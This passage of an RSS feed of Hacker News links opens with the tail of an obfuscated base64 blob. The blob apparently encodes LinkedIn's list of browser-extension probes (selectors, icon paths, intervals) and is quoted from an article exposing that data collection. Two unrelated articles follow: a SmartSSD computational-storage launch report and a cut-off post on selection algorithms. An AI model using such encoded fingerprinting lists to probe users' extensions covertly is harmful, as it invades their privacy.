NjVcdTAwNjNcdTAwNzJcdTAwNzVcdTAwNjlcdTAwNzRcdTAwNjVcdTAwNzIiXSwiXHUwMDY0XHUwMDZmXHUwMDZkIjp7Ilx1MDA3M1x1MDA2NVx1MDA2Y1x1MDA2NVx1MDA2M1x1MDA3NFx1MDA2Zlx1MDA3MiI6W119LCJcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDYzXHUwMDY2XHUwMDY2XHUwMDY3XHUwMDZhXHUwMDY3XHUwMDY5XHUwMDY3XHUwMDZhXHUwMDY2XHUwMDY3XHUwMDZhXHUwMDZiXHUwMDY2XHUwMDY0XHUwMDZmXHUwMDcwXHUwMDYyXHUwMDZmXHUwMDYyXHUwMDYyXHUwMDY0XHUwMDYxXHUwMDY0XHUwMDYxXHUwMDY1XHUwMDZjXHUwMDYyXHUwMDY4XHUwMDY1XHUwMDcwXHUwMDZmXHUwMDJmXHUwMDY5XHUwMDZkXHUwMDYxXHUwMDY3XHUwMDY1XHUwMDczXHUwMDJmXHUwMDY5XHUwMDYzXHUwMDZmXHUwMDZlXHUwMDJlMTI4XHUwMDJlXHUwMDcwXHUwMDZlXHUwMDY3Il19LHsiXHUwMDZlXHUwMDYxXHUwMDZkXHUwMDY1IjoiXHUwMDc3XHUwMDQ0XHUwMDQzXHUwMDQ3XHUwMDU3XHUwMDRiXHUwMDY2XHUwMDczXHUwMDY0XHUwMDVhIiwiXHUwMDY5XHUwMDZlXHUwMDc0XHUwMDY1XHUwMDcyXHUwMDc2XHUwMDYxXHUwMDZjIjo4NjQwMDAwMCwiXHUwMDY0XHUwMDYxXHUwMDc0XHUwMDY1IjowLCJcdTAwNzRcdTAwNmZcdTAwNzBcdTAwNTBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDcwXHUwMDcyXHUwMDZmXHUwMDY2XHUwMDY5XHUwMDZjXHUwMDY1IiwiXHUwMDcyXHUwMDY1XHUwMDYzXHUwMDcyXHUwMDc1XHUwMDY5XHUwMDc0XHUwMDY1XHUwMDcyIl0sIlx1MDA2NFx1MDA2Zlx1MDA2ZCI6eyJcdTAwNzNcdTAwNjVcdTAwNmNcdTAwNjVcdTAwNjNcdTAwNzRcdTAwNmZcdTAwNzIiOlsiXHUwMDIzXHUwMDY0XHUwMDZjXHUwMDc5XHUwMDVmXHUwMDY5XHUwMDYzXHUwMDZmXHUwMDZlXHUwMDVmXHUwMDYxXHUwMDcyXHUwMDY1XHUwMDYxIl19LCJcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDY0XHUwMDY5XHUwMDZhXHUwMDY4XHUwMDYzXHUwMDcwXHUwMDYyXHUwMDZiXHUwMDYxXHUwMDZjXHUwMDY2XHUwMDY3XHUwMDZiXHUwMDYzXHUwMDY1XHUwMDYyXHUwMDY3XHUwMDZmXHUwMDZlXHUwMDYzXHUwMDZhXHUwMDZkXHUwMDY2XHUwMDcwXHUwMDYyXHUwMDYxXHUwMDZkXHUwMDY5XHUwMDY4XHUwMDY3XHUwMDYxXHUwMDY2XHUwMDJmXHUwMDZjXHUwMDY5XHUwMDVmXHUwMDczXHUwMDZmXHUwMDYzXHUwMDY5XHUwMDYxXHUwMDZjXHUwMDVmXHUwMDcwXHUwMDZjXHUwMDc1XHUwMDY3XHUwMDY5XHUwMDZlXHUwMDJlXHUwMDYzXHUwMDczXHUwMDczIl19LHsiXHUwMDZlXHUwMDYxXHUwMDZkXHUwMDY1IjoiXHUwMDUwXHUwMDQ3XHUwMDRkXHUwMDU2XHUwMDQ0XHUwMDczXHUwMDY2IiwiXHUwMDY5XHUwMDZlXHUwMDc0XHUwMDY1XHUwMDcyXHUwMDc2XHUwMDYxXHUwMDZjIjozNjAwMDAwLCJcdTAwNjRcdTAwNjFcdTAwNzRcdTAwNjUiOjAsIlx1MDA3NFx1MDA2Zlx1MDA3MFx1MDA1MFx1MDA2MVx1MDA3NFx1MDA2OCI6WyJcdTAwNzBcdTAwNzJcdTAwNmZcdTAwNjZcdTAwNjlcdTAwNmNcdTAwNjUiLCJcdTAwNzJcdTAwNjVcdTAwNjNcdTAwNzJcdTAwNzVcdTAwNjlcdTAwNzRcdTAwNjVcdTAwNzIiXSwiXHUwMDY0XHUwMDZmXHUwMDZkIjp7Ilx1MDA3M1x1MDA2NVx1MDA2Y1x1MDA2NVx1MDA2M1x1MDA3NFx1MDA2Zlx1MDA3MiI6WyJcdTAwMmVcdTAwNjVcdTAwNjNcdTAwNzFcdTAwNzVcdTAwNjlcdTAwNzJcdTAwNjVcdTAwMmRcdTAwNjJcdTAwNzVcdTAwNzRcdTAwNzRcdTAwNmZcdTAwNmUiXX0sIlx1MDA3MFx1MDA2MVx1MDA3NFx1MDA2OCI6W119LHsiXHUwMDZlXHUwMDYxXHUwMDZkXHUwMDY1IjoiXHUwMDUwXHUwMDc4XHUwMDQzXHUwMDc5XHUwMDRmXHUwMDRjXHUwMDU2XHUwMDY0XHUwMDY0XHUwMDQ2XHUwMDU3XHUwMDczXHUwMDU4IiwiXHUwMDY5XHUwMDZlXHUwMDc0XHUwMDY1XHUwMDcyXHUwMDc2XHUwMDYxXHUwMDZjIjo4NjQwMDAwMCwiXHUwMDY0XHUwMDYxXHUwMDc0XHUwMDY1IjowLCJcdTAwNzRcdTAwNmZcdTAwNzBcdTAwNTBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDcwXHUwMDcyXHUwMDZmXHUwMDY2XHUwMDY5XHUwMDZjXHUwMDY1IiwiXHUwMDcyXHUwMDY1XHUwMDYzXHUwMDcyXHUwMDc1XHUwMDY5XHUwMDc0XHUwMDY1XHUwMDcyIl0sIlx1MDA2NFx1MDA2Zlx1MDA2ZCI6eyJcdTAwNzNcdTAwNjVcdTAwNmNcdTAwNjVcdTAwNjNcdTAwNzRcdTAwNmZcdTAwNzIiOlsiXHUwMDIzXHUwMDY1XHUwMDYyXHUwMDczXHUwMDc0XHUwMDYxXHUwMDYyXHUwMDYxXHUwMDcyIl19LCJcdTAwNzBcdTAwNjFcdTAwNzRcdTAwNjgiOlsiXHUwMDYyXHUwMDZlXHUwMDY1XHUwMDY1XHU…</code></pre></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users">https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users</a></em></p>]]>
            </description>
            <link>https://prophitt.me/a-look-at-how-linkedin-exfiltrates-extension-data-from-their-users</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060089</guid>
            <pubDate>Wed, 11 Nov 2020 16:58:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Xilinx-Samsung SmartSSD Computational Storage Drive Launched]]>
            </title>
            <description>
<![CDATA[
Score 115 | Comments 81 (<a href="https://news.ycombinator.com/item?id=25059946">thread link</a>) | @blopeur
<br/>
November 11, 2020 | https://www.servethehome.com/xilinx-samsung-smartssd-computational-storage-drive-launched/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/xilinx-samsung-smartssd-computational-storage-drive-launched/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1.jpg" data-caption="Smartssd Pr 1120x560"><img width="696" height="461" src="https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1-696x461.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1-696x461.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1-400x265.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1-634x420.jpg 634w, https://www.servethehome.com/wp-content/uploads/2020/11/smartssd-pr-1120x560-1.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Smartssd Pr 1120x560" title="Smartssd Pr 1120x560"></a><figcaption>Smartssd Pr 1120x560</figcaption></figure></div>
            <!-- content --><p>Computational storage is a small but growing segment of the market. To address this, the Samsung SmartSSD is being launched with a Xilinx Kintex FPGA inside to bring computational storage capabilities in a standard form factor. In this article, we are going to discuss how Xilinx and Samsung are delivering a computational storage platform.<span id="more-48283"></span></p>
<h2>Xilinx-Samsung SmartSSD Background</h2>
<p>First, why computational storage. One of the big drivers is that moving data, at high speeds, across systems can use a lot of power and consumes bandwidth. With computational storage, data can be processed without bringing it back to the main CPU.</p>
<figure id="attachment_48289" aria-describedby="caption-attachment-48289"><a href="https://www.servethehome.com/?attachment_id=48289" rel="attachment wp-att-48289"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand.png" alt="Xilinx SmartSSD Computational Storage Demand" width="1511" height="825" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand.png 1511w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-400x218.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-800x437.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-696x380.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-1068x583.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Demand-769x420.png 769w" sizes="(max-width: 1511px) 100vw, 1511px"></a><figcaption id="caption-attachment-48289">Xilinx SmartSSD Computational Storage Demand</figcaption></figure>
<p>Part of the other driver here is that Xilinx sees computational storage as becoming mainstream, projected to be 5% of the market in only a few years. For its part, Xilinx is covering a number of different types of accelerators aside form the Samsung SmartSSD including those from Pliops, ScaleFlux, and BittWare.</p>
<figure id="attachment_48288" aria-describedby="caption-attachment-48288"><a href="https://www.servethehome.com/?attachment_id=48288" rel="attachment wp-att-48288"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream.png" alt="Xilinx SmartSSD Computational Storage Becoming Mainstream" width="1481" height="781" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream.png 1481w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-400x211.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-800x422.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-696x367.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-1068x563.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Computational-Storage-Becoming-Mainstream-796x420.png 796w" sizes="(max-width: 1481px) 100vw, 1481px"></a><figcaption id="caption-attachment-48288">Xilinx SmartSSD Computational Storage Becoming Mainstream</figcaption></figure>
<p>The basic Samsung SmartSSD has two main sets of components. One is basically a 4TB Samsung V-NAND SSD. This includes a NAND controller, and we are told DRAM for the controller to use as well. The second part of the solution is a Xilinx Kintex FPGA with its own 4GB of memory.</p>
<figure id="attachment_48285" aria-describedby="caption-attachment-48285"><a href="https://www.servethehome.com/?attachment_id=48285" rel="attachment wp-att-48285"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components.png" alt="Samsung Xilinx SmartSSD Internal Components" width="1263" height="783" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components.png 1263w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-400x248.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-800x496.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-696x431.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-1068x662.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-677x420.png 677w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Components-356x220.png 356w" sizes="(max-width: 1263px) 100vw, 1263px"></a><figcaption id="caption-attachment-48285">Samsung Xilinx SmartSSD Internal Components</figcaption></figure>
<p>The basic flow is that commands can be issued to either the SSD or the FPGA portion of the drive and processing can occur at the FPGA instead of going back to the host system.</p>
<figure id="attachment_48286" aria-describedby="caption-attachment-48286"><a href="https://www.servethehome.com/?attachment_id=48286" rel="attachment wp-att-48286"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation.png" alt="Samsung Xilinx SmartSSD Internal Operation" width="1456" height="836" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation.png 1456w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-400x230.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-800x459.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-696x400.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-1068x613.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Samsung-Xilinx-SmartSSD-Internal-Operation-731x420.png 731w" sizes="(max-width: 1456px) 100vw, 1456px"></a><figcaption id="caption-attachment-48286">Samsung Xilinx SmartSSD Internal Operation</figcaption></figure>
<p>We are going to show an example later but a common question will be how are these programmed. One can use a standard storage stack or the OpenCL stack for computational storage aspects.</p>
<figure id="attachment_48291" aria-describedby="caption-attachment-48291"><a href="https://www.servethehome.com/?attachment_id=48291" rel="attachment wp-att-48291"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack.png" alt="Xilinx SmartSSD IP Runtime Stack" width="1470" height="723" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack.png 1470w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-400x197.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-800x393.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-696x342.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-1068x525.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-854x420.png 854w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-324x160.png 324w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Runtime-Stack-533x261.png 533w" sizes="(max-width: 1470px) 100vw, 1470px"></a><figcaption id="caption-attachment-48291">Xilinx SmartSSD IP Runtime Stack</figcaption></figure>
<p>As one would expect with a FPGA, there is a tie in with partner IP solutions as well as those that Xilinx and Samsung will have.</p>
<figure id="attachment_48290" aria-describedby="caption-attachment-48290"><a href="https://www.servethehome.com/?attachment_id=48290" rel="attachment wp-att-48290"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development.png" alt="Xilinx SmartSSD IP Development" width="1487" height="727" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development.png 1487w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-400x196.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-800x391.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-696x340.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-1068x522.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-859x420.png 859w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Development-533x261.png 533w" sizes="(max-width: 1487px) 100vw, 1487px"></a><figcaption id="caption-attachment-48290">Xilinx SmartSSD IP Development</figcaption></figure>
<p>The Xilinx Storage Services (XSS) are offloads available for the platform. These include compression and crypto offloads.</p>
<figure id="attachment_48292" aria-describedby="caption-attachment-48292"><a href="https://www.servethehome.com/?attachment_id=48292" rel="attachment wp-att-48292"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services.png" alt="Xilinx SmartSSD IP Xilinx Storage Services" width="1531" height="786" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services.png 1531w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-400x205.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-800x411.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-696x357.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-1068x548.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-IP-Xilinx-Storage-Services-818x420.png 818w" sizes="(max-width: 1531px) 100vw, 1531px"></a><figcaption id="caption-attachment-48292">Xilinx SmartSSD IP Xilinx Storage Services</figcaption></figure>
<p>Taking the compression in VDO as an example, the following slides have the basic flow:</p>
<figure id="attachment_48294" aria-describedby="caption-attachment-48294"><a href="https://www.servethehome.com/?attachment_id=48294" rel="attachment wp-att-48294"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1.png" alt="Xilinx SmartSSD VDO 1" width="1379" height="780" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1.png 1379w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-400x226.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-800x453.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-696x394.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-1068x604.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-1-743x420.png 743w" sizes="(max-width: 1379px) 100vw, 1379px"></a><figcaption id="caption-attachment-48294">Xilinx SmartSSD VDO 1</figcaption></figure>
<p>For reads, the FPGA is used to decompress data at the SmartSSD. By putting the compression on the SSD, Xilinx says it can get better compression ratios.</p>
<figure id="attachment_48295" aria-describedby="caption-attachment-48295"><a href="https://www.servethehome.com/?attachment_id=48295" rel="attachment wp-att-48295"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2.png" alt="Xilinx SmartSSD VDO 2" width="1447" height="784" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2.png 1447w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-400x217.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-800x433.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-696x377.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-1068x580.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-VDO-2-775x420.png 775w" sizes="(max-width: 1447px) 100vw, 1447px"></a><figcaption id="caption-attachment-48295">Xilinx SmartSSD VDO 2</figcaption></figure>
<p>In terms of examples, we wanted to highlight one from Lewis Rhodes Labs where they are doing NPUSearch using computational storage. Effectively here the SmartSSDs are being used to scale out the number of accelerators with the number of SSDs. An application can send requests to the storage, data can be evaluated at the drives, and only results passed back to the main system.</p>
<figure id="attachment_48293" aria-describedby="caption-attachment-48293"><a href="https://www.servethehome.com/?attachment_id=48293" rel="attachment wp-att-48293"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search.png" alt="Xilinx SmartSSD Lewis Rhodes Labs Search" width="1538" height="837" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search.png 1538w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-400x218.png 400w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-800x435.png 800w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-1536x836.png 1536w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-696x379.png 696w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-1068x580.png 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/Xilinx-SmartSSD-Lewis-Rhodes-Labs-Search-772x420.png 772w" sizes="(max-width: 1538px) 100vw, 1538px"></a><figcaption id="caption-attachment-48293">Xilinx SmartSSD Lewis Rhodes Labs Search</figcaption></figure>
<p>Since many of our readers will have noticed this, we asked about the PCIe Gen3 and we were told that there is a roadmap to the future.</p>
<h2>Final Words</h2>
<p>For STH readers, an immediate question is going to be why computational storage? Part of this model is that accelerators are tied to storage. For accelerator companies, this is great. Many of our readers though are going to ask about why not use DPUs instead. If you missed it&nbsp;<a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> is a good resource there. We asked since if the only goal is offload, and the SmartSSD is in many ways two devices that are co-packaged, then it could make sense to offload to a bigger chip. We were told that it is less expensive to use a smaller accelerator on each drive than to scale to a larger accelerator. This is one area that we know there is a lot of momentum behind each model in the data center. It will be interesting to see which ultimately wins.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/xilinx-samsung-smartssd-computational-storage-drive-launched/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059946</guid>
            <pubDate>Wed, 11 Nov 2020 16:46:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Miniselect: Practical and Generic Selection Algorithms]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25059942">thread link</a>) | @cristaloleg
<br/>
November 11, 2020 | https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/ | <a href="https://web.archive.org/web/*/https://danlark.org/2020/11/11/miniselect-practical-and-generic-selection-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-555">

	

	
	<div>
		
<p>Today I present a big effort from my side to publish <a href="https://github.com/danlark1/miniselect">miniselect</a> — generic C++ library to support multiple selection and partial sorting algorithms. It is already <a href="https://github.com/ClickHouse/ClickHouse/pull/16825">used</a> in <a href="https://clickhouse.tech/">ClickHouse</a> with huge performance benefits. Exact benchmarks and results will be later in this post and now let’s tell some stories about how it all arose. I publish this library under Boost License and any contributions are highly welcome.</p>



<h2>It all started with sorting</h2>



<p>While reading lots of articles, papers, and posts from Hacker News, I found it pretty funny each several months new “shiny”, “fastest”, “generic” sorting algorithms to come or remembered from old papers such as the recent paper on <a href="https://blog.acolyer.org/2020/10/19/the-case-for-a-learned-sorting-algorithm/">learned sorting</a>, <a href="https://sortingsearching.com/2020/06/06/kirkpatrick-reisch.html">Kirkpatrick-Reisch</a> sort or <a href="https://news.ycombinator.com/item?id=14661659">pdqsort</a>. It is that we are essentially 65+ years into writing sorting algorithms, and we still find improvements. Shouldn’t sorting items be a “solved” problem by now? Unfortunately, not. New hardware features come, we find that sorting numbers can be actually done faster than best comparison <img src="https://s0.wp.com/latex.php?latex=O%28n+%5Clog+n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n \log n)" title="O(n \log n)"> time complexity and we still find improvements in sorting algorithms like avoiding <a href="https://www.researchgate.net/publication/301614727_BlockQuicksort_How_Branch_Mispredictions_don't_affect_Quicksort">branches in partitions</a> and trying to find good pivots as pdqsort does. Also, there are many open questions in that area as “what is the minimum number of comparisons needed?”.</p>



<p>Huge competition is still going on in sorting algorithms and I believe we are not near the optimal sorting and learned sorting looks like the next step. But it uses the fundamental fact that no one expects sorting to be completed in a couple of passes and we can understand something about data during first array passes. We will understand why it matters later.</p>



<p>My favorite general sorting is <a href="https://github.com/orlp/pdqsort">pdqsort</a>, it proves to be currently the best general sorting algorithm and it shows a significant boost over all standard sorts that are provided in C++. It is also <a href="https://docs.rs/pdqsort/1.0.3/pdqsort/">used</a> in Rust.</p>



<h2>Selection and Partial Sorting</h2>



<p>Nearly a couple of months ago I started thinking about a slightly different approach when it comes to sorting — partial sorting algorithms. It means that you don’t need to sort all <img src="https://s0.wp.com/latex.php?latex=n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n" title="n"> elements but only find <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> smallest and sort them. For example, it is widely used in SQL queries when you do <code>ORDER BY LIMIT N</code> and <code>N</code> is often small, from 1-10 to ideally couple of thousands, bigger values still happen but rare. And, oh god, how little engineering and theoretical research has been done there compared to full sorting algorithms. In fact, the question of specifically finding <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th order statistics when <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> is small is open and no good solution is presented. Also, partial sorting is quite easy to obtain after that, you need to sort the first <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> elements by some sorting algorithm to get optimal <img src="https://s0.wp.com/latex.php?latex=O%28n+%2B+k+%5Clog+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n + k \log k)" title="O(n + k \log k)"> comparisons and we will look at only one example when it is not the case. Yes, there are a bunch of median algorithms that can be generalized to find the <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th smallest element. So, what are they? Yeah, you may know some of them but let’s revise, it is useful to know your enemies.</p>



<h3>QuickSelect</h3>



<p>This is almost the very first algorithm for finding the <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th smallest element, just do like <a href="https://en.wikipedia.org/wiki/Quicksort">QuickSort</a> but don’t go recursively in two directions, that’s it. Pick middle or even random element and partition by this element, see in which of two parts <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k"> is located, update the one of the borders, voila, after maximum of <img src="https://s0.wp.com/latex.php?latex=n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n" title="n"> partitions you will find <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th smallest element. Good news that on average it takes <img src="https://s0.wp.com/latex.php?latex=O%28n%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="O(n)" title="O(n)"> comparisons if we pick random pivot. That is because if we define <img src="https://s0.wp.com/latex.php?latex=C%28n%2C+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n, k)" title="C(n, k)"> is the expected number of comparisons for finding <img src="https://s0.wp.com/latex.php?latex=k&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="k" title="k">th element in <img src="https://s0.wp.com/latex.php?latex=n&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n" title="n"> elements and <img src="https://s0.wp.com/latex.php?latex=C%28n%29+%3D+%5Cmax_%7B1%7D%5E%7Bn%7D+C%28n%2C+k%29&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="C(n) = \max_{1}^{n} C(n, k)" title="C(n) = \max_{1}^{n} C(n, k)">, then during one stage we do <img src="https://s0.wp.com/latex.php?latex=n+-+1&amp;bg=FFFFFF&amp;fg=181818&amp;s=0&amp;c=20201002" alt="n - 1" title="n - 1"> comparisons and uniformly pick any pivot, then even if we pick the biggest part on each step</p>



